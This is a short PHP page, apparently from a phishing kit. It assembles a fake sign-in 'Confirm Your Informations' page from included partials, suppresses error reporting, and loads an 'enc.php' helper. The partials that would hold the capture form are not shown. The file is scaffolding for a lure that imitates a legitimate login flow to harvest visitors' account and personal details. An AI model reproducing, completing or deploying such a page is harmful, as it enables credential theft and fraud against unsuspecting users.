<?php 
    @error_reporting(0);
    session_start();
    require "partials/enc.php";
?>
<?php include 'partials/header.php'; ?>
    <div id="content">
        <div class="extra-container">
            <?php include 'partials/nav.php'; ?>

            <div id="flow">
                <div class="flow-body signin clearfix" role="main">

                    <?php include 'partials/head.php'; ?>

                    <?php include 'partials/container.php'; ?>

                </div>
            </div>

            <script type="text/javascript">
                $('title').text('Confirm Your Informations');
            </script>
<?php include 'partials/footer.php'; ?>